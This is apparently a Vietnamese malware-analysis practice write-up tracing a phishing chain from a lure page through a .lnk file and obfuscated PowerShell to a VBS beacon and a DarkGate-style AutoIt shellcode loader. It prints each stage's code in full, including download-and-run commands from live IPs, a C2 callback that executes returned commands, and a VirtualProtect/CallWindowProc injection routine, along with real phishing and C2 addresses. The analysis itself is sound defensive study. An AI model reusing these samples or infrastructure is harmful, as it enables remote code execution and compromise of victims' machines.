### Luyện tập 1
  
Link phishing: https://lingiangcosmetic.com/quotation

![](https://hackmd.io/_uploads/S1OrkypWp.png)

View page source ta có thể thấy đường dẫn file ChungLG.js "đáng ngờ". Sau đó thông qua `search-ms` đẫn người dùng truy cập đến địa chỉ `194.87.31.108:8080` để thực hiện tải file độc hại

![](https://hackmd.io/_uploads/By0leJaZT.png)


![](https://hackmd.io/_uploads/r16by1pbT.png)

Người dùng bị lừa tải file shortcut(.lnk) và thực thi powershell script độc hại bị nhúng trong file `.lnk`

![](https://hackmd.io/_uploads/rkGfZy6-p.png)


```
$path = $env:TEMP + '\ldOGUevTtt.pdf';$secondPath=$env:TEMP+'\HYFmFrcWvQ.vbs';$pHqgh='';$pHqgh+='Invoke-WebRe';$WJNzC=690;$pHqgh+='quest -Uri "';$pHqgh+='http://89.23';$pHqgh+='.100.222:80/';$pHqgh+='foo/neverban';$TjHvT=9796;$pHqgh+='_SUCBAm.vbs"';$pHqgh+=' -OutFile $s';$pHqgh+='econdPath;St';$pHqgh+='art-Process ';$TzMnd= $WJNzC+ $WJNzC;$pHqgh+='-FilePath $s';$pHqgh+='econdPath;In';$pHqgh+='voke-WebRequ';$pHqgh+='est -Uri "ht';$RZjYx=167;$pHqgh+='tps://files.';$pHqgh+='catbox.moe/b';$pHqgh+='8bf3x.pdf" -';$pHqgh+='OutFile $pat';$yJYYz=9737;$pHqgh+='h;Start-Proc';$pHqgh+='ess -FilePat';$pHqgh+='h $path;';.([char](21*5) + [char](51+50) + [char](20*6)) $pHqgh;

```
Thực hiện deobfuscation đoạn powershell script thu được:
``` 
Invoke-WebRequest -Uri "http://89.23.100.222:80/foo/neverban_SUCBAm.vbs" -OutFile $secondPath;
Start-Process -FilePath $secondPath;
Invoke-WebRequest -Uri "https://files.catbox.moe/b8bf3x.pdf" -OutFile $path;
Start-Process -FilePath $path;
```
Khi đoạn powershell được thực thi file visual basic script đáng ngờ `SUCBAm.vbs` lưu tại `$path = $env:TEMP`

Nội dung file vbs
```
wecabepzyf = "cmd"
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
dim all_process

Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process")
For Each objProcess in colProcesses
  all_process = all_process & objProcess.Name
Next



qezogvuos = "Shell.Application"



vhfvmeyvgucbd="http://vntricker.abcxzy.com:2351/nlhsapgv"
vwmlbmy="WINHTTP.WinHTTPRequest.5.1"



With CreateObject(vwmlbmy)
.Open "post", vhfvmeyvgucbd, False
.setRequestHeader "a", all_process
.send
vwmlbmy2 = .responseText
CreateObject(qezogvuos).ShellExecute wecabepzyf, vwmlbmy2 ,"","",0
End With

wscript.quit
MsgBox "ss"'slush devote minimum step between field play taxi bitter gallery nuclear stuff average elite lens reveal vague country illness pause vast claw girl omit sport april drip kiwi receive toilet category fox orient state artist earn laugh pumpkin target bike edit leader put tragic butter fiscal marble subject aware debris judge potato three bonus face mean search when crater glance napkin slam address desert hint piano switch broken feel minimum rule voice color fuel owner soft allow disagree jacket quantum term amateur dawn hybrid park such awkward domain illness pattern spice antenna deliver health pen spoon actress deposit hen opinion slide wink cross labor region tooth cry hope sad universe change fury model salt want consider guess panic subject ability debate gauge obvious special abuse defense hat peace size apart crash glance member seed twenty describe glove orbit slot wisdom clutch frequent mind shallow wool collect fiction magnet sail unusual bird egg ivory quality trap cabbage elephant length rabbit there camp extend library rally thumb answer delay ginger mutual second verb carry force opera sell wing catalog favorite lounge stand agent dial hood nice soap assume economy iron pledge stove alpha damp guess moon sibling abandon choice letter post sugar absurd course floor maze right velvet bottom engine kingdom ready vessel brave entire lonely
```
Chức năng của file `SUCBAm.vbs` gửi tất cả tiến trình đang chạy trên máy nạn nhân(mục đích có thể là kiểm tra máy nạn nhân có đang cài av hoặc file vbs đang chay trong môi trường ảo hóa hay không?) tới `http://vntricker.abcxzy.com:2351/nlhsapgv`. Sau đó sẽ nhận lại được cmd command từ phía C&C server và thực thi nó `vwmlbmy2 =.responseText;CreateObject(qezogvuos).ShellExecute wecabepzyf, vwmlbmy2 ,"","",0`

malicous command được nhận lại từ CnC Server:

![](https://hackmd.io/_uploads/r1ryqxpb6.png)


Lệnh hình trên với chức năng tải tệp thực thi Autoit.exe và tệp autoit script(.au3) độc hại và thực thi nó. 

Nội dụng file autoscript độc hại trích xuất:

```
LOCAL $XHKOUYMY
#NoTrayIcon
LOCAL $NZCLH
FUNC DECRYPTFILEWITHKEY($SFILEPATH,$SKEY)
LOCAL $XMDO
LOCAL $HFILE=FILEOPEN($SFILEPATH,16)
LOCAL $PSQCQA
LOCAL $JQVUEN
IF $HFILE=-1 THEN
LOCAL $EFSPOJC
MSGBOX(0,"Error","unable to open.")
LOCAL $KKJLNGV
RETURN SETERROR(1,0,"")
LOCAL $CQXZHMJC
ENDIF
LOCAL $YFUUQ
LOCAL $OVPF
LOCAL $BCONTENT=FILEREAD($HFILE)
LOCAL $EKLPP
FILECLOSE($HFILE)
LOCAL $WRYE
LOCAL $LPCLOBTK
LOCAL $SCONTENT=BINARYTOSTRING($BCONTENT)
LOCAL $IVRK
LOCAL $ISTART=STRINGINSTR($SCONTENT,"padoru")+6
LOCAL $YKMURDFMW
LOCAL $IEND=STRINGINSTR($SCONTENT,"padoru",0,-1,$ISTART)
LOCAL $WITXQN
LOCAL $QFYPF
IF $ISTART=6 OR $IEND=0 THEN
LOCAL $KDDH
MSGBOX(0,"Error","delimiter not found.")
LOCAL $ASYSTN
RETURN SETERROR(2,0,"")
LOCAL $SZMGNTKTG
ENDIF
LOCAL $PFAFRWZQ
LOCAL $KUXBBS
LOCAL $STODECRYPT=STRINGMID($SCONTENT,$ISTART,$IEND-$ISTART)
LOCAL $ESCTQGDEL
LOCAL $BTODECRYPT=STRINGTOBINARY($STODECRYPT)
LOCAL $CPJVPQ
LOCAL $IBLOCKSIZE=32768
LOCAL $WMONEERN
LOCAL $ILEN=BINARYLEN($BTODECRYPT)
LOCAL $XSEX
LOCAL $MQIEXVNMC
LOCAL $TBYTE=DLLSTRUCTCREATE("byte[1]")
LOCAL $JWWEB
LOCAL $IKEYALT=0,$B_DECRYPTED=BINARY("")
LOCAL $BDKSVERZU
LOCAL $IKEYLEN=STRINGLEN($SKEY)
LOCAL $ZAQVUPZ
LOCAL $RGDJOVN
FOR $I=1 TO $IKEYLEN
LOCAL $LEJBDITZV
$IKEYALT=BITXOR(BINARYMID($SKEY,$I,1),$IKEYALT)
LOCAL $IKXAHLJ
NEXT
LOCAL $BICSWZ
LOCAL $SXYDVYLD
FOR $I=1 TO $ILEN STEP $IBLOCKSIZE
LOCAL $ODNCABBAE
LOCAL $IBLOCKLEN=$IBLOCKSIZE
LOCAL $KSJXJW
IF $I+$IBLOCKLEN>$ILEN THEN $IBLOCKLEN=$ILEN-$I+1
LOCAL $CZXLDCNDT
LOCAL $BBLOCK=BINARYMID($BTODECRYPT,$I,$IBLOCKLEN)
LOCAL $AWDO
LOCAL $BDECRYPTEDBLOCK=BINARY("")
LOCAL $PUHV
FOR $J=1 TO BINARYLEN($BBLOCK)
LOCAL $FKDGGCW
EXECUTE(BINARYTOSTRING("0x202020202020202020202020446C6C53747275637453657444617461282474427974652C20312C20426974584F522842696E6172794D6964282462426C6F636B2C20246A2C2031292C2024694B6579416C742929"))
LOCAL $ZHIYV
$BDECRYPTEDBLOCK&=DLLSTRUCTGETDATA($TBYTE,1)
LOCAL $PXDIU
NEXT
LOCAL $FMZTUNVX
$B_DECRYPTED&=$BDECRYPTEDBLOCK
LOCAL $ZKELJB
NEXT
LOCAL $SIJD
LOCAL $FPVGHYUJF
RETURN $B_DECRYPTED
LOCAL $CVKFMB
ENDFUNC
LOCAL $TKFQLZGM
LOCAL $MILIAN
LOCAL $EOYWU
LOCAL $SKEY="darkgate"
LOCAL $UETGTR
LOCAL $SDECRYPTEDCONTENT=DECRYPTFILEWITHKEY(@SCRIPTFULLPATH,$SKEY)
LOCAL $MKHVNXLZM
LOCAL $IZEQ
LOCAL $YPZBWR
$OVSJZRCCSX=$SDECRYPTEDCONTENT
LOCAL $OEVLVQC
$IUFKJUJZVJ=DLLSTRUCTCREATE("byte["&BINARYLEN($OVSJZRCCSX)&"]")
LOCAL $ICADKEIYH
LOCAL $OLDPROTECT
LOCAL $DRXZUZG
LOCAL $XOCRJ
IF (NOT FILEEXISTS("C:\Program Files (x86)\Sophos"))THEN
LOCAL $LNGYN
EXECUTE(BINARYTOSTRING("0x446C6C43616C6C28226B65726E656C33322E646C6C222C2022424F4F4C222C20225669727475616C50726F74656374222C2022707472222C20446C6C53747275637447657450747228244975464B4A554A5A766A292C2022696E74222C2042696E6172794C656E28246F76736A5A5243435358292C202264776F7264222C20307834302C202264776F72642A222C20246F6C6470726F7465637429"))
;DllCall("kernel32.dll", "BOOL", "VirtualProtect", "ptr", DllStructGetPtr($IuFKJUJZvj), "int", BinaryLen($ovsjZRCCSX), "dword", 0x40, "dword*", $oldprotect)	
LOCAL $HBDT
ENDIF
LOCAL $VAHABQTNH
LOCAL $SGVZGT
EXECUTE(BINARYTOSTRING("0x446C6C5374727563745365744461746128244975464B4A554A5A766A2C20312C20246F76736A5A524343535829"))
;DllStructSetData($IuFKJUJZvj, 1, $ovsjZRCCSX)
LOCAL $NVSVP
EXECUTE(BINARYTOSTRING("0x446C6C43616C6C28227573657233322E646C6C222C20226C726573756C74222C20224322266368722839372926226C6C57696E646F7750726F63222C2022707472222C20446C6C53747275637447657450747228244975464B4A554A5A766A292C202268776E64222C20302C202275696E74222C20302C202277706172616D222C20302C20226C706172616D222C203029"))
;DllCall("user32.dll", "lresult", "C"&chr(97)&"llWindowProc", "ptr", DllStructGetPtr($IuFKJUJZvj), "hwnd", 0, "uint", 0, "wparam", 0, "lparam", 0)
LOCAL $FBFJJUVM
LOCAL $EYMMI
LOCAL $QTZMYCV
```

Đoạn mã trên autoit script trên có giải mã phần dữ liệu đươc đặt dữa 2 kí tự `padoru` và thưc hiện tiêm và thực thi đoạn  shellcode

Phân tích shellcode thấy chức năng của nó drop và thực thi file PE độc hại

![](https://hackmd.io/_uploads/HylAse6b6.png)

